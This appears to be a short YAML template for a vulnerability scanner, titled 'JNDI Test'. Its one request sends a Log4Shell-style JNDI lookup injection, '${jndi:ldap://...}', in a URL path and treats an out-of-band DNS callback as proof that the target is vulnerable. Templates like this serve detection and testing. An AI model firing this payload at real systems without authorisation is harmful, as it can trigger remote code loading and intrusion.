id: jndi-test

info:
  name: JNDI Test
  author: zan8in
  severity: high
  verified: false
  description: |-
    JNDI Test
  tags: jndi,test
  created: 2024/01/16

set:
  oob.DNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /jnditest/${jndi:ldap://{{oob.DNS}}}
    expression: oobWait(oob, oob.ProtocolDNS, 3)
expression: r0()
